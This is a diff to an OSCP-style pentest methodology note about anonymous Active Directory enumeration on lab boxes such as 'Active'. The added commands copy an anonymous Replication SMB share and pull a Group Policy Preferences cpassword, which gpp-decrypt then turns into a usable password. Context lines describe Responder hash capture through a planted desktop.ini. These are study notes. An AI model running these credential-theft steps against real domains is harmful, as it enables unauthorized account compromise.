@@ -15,6 +15,18 @@ ldapsearch -x -H ldap://$BoxIP \
 smbclient -N -L //$BoxIP
 ```
 
+If anonymous SMB exposes a readable `Replication` share, copy the policy tree and inspect Group Policy Preferences XML for a managed `cpassword` value:
+
+```bash
+smbclient //$BoxIP/Replication -N -c 'recurse ON; prompt OFF; mget *'
+mv $Domain $BoxDir/loot/Replication
+rg -n 'cpassword|userName' $BoxDir/loot/Replication
+gpp-decrypt "$(awk -F'cpassword=\"' '{print $2}' $BoxDir/loot/Replication/Policies/*/MACHINE/Preferences/Groups/Groups.xml | awk -F'\"' '{print $1}')"
+```
+
+> [!warning] 💡
+> A readable `Replication` share can disclose a reversible GPP-managed credential even when anonymous RPC and subtree LDAP enumeration are denied. Save the policy tree, recover the credential offline, and validate it at Step 40 · [[AD - Credential Validation]].
+
 ## Example output
 
 ```
@@ -30,6 +42,7 @@ Anonymous login successful for IPC$
 - [ ] All three returned nothing useful → **Go to Step 37 · [[AD - Web Enum]]**
 - [ ] Anonymous access was denied everywhere → **Go to Step 37 · [[AD - Web Enum]]**
 - [ ] A writable SMB share is found → **Run `sudo responder -I tun0`, upload the authorized `desktop.ini` with `smbclient //$BoxIP/$Share -N -c 'put desktop.ini'`, then crack any captured response and validate it at Step 40 · [[AD - Credential Validation]]**
+- [ ] Anonymous `Replication` is readable → **Run `smbclient //$BoxIP/Replication -N -c 'recurse ON; prompt OFF; mget *'`, inspect `Groups.xml` for `cpassword`, run `gpp-decrypt`, then validate the recovered account at Step 40 · [[AD - Credential Validation]]**
 
 ## Notes
 
@@ -59,6 +72,7 @@ The file must be in the share root with the exact generated filename. Keep Respo
 > The file must be named exactly desktop.ini and placed in the root of the share.
 ## Seen in
 - *(no write-up yet)*
+- [[OSCP/BOXES/WRITE UPS/AD/Active|Active]] -- anonymous SMB exposed the readable Replication share and GPP policy files
 
 ## Related stages
 
